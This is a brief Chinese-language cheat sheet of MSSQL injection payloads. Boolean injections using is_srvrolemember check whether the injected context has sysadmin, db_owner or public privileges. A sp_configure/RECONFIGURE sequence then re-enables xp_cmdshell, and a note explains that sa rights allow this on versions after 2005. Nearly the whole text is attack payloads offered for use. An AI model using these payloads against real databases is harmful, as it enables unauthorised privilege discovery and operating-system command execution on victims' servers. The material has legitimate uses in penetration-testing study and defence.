
### 　and 1=(select is_srvrolemember(‘sysadmin’)) //判断是否是系统管理员
### 　and 1=(select is_srvrolemember(‘db_owner’)) //判断是否是库权限
### and 1=(select is_srvrolemember(‘public’)) //判断是否为public权限


### EXEC sp_configure 'show advanced options',1//允许修改高级参数
### RECONFIGURE
### EXEC sp_configure 'xp_cmdshell',1  //打开xp_cmdshell扩展
### RECONFIGURE


#### xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。
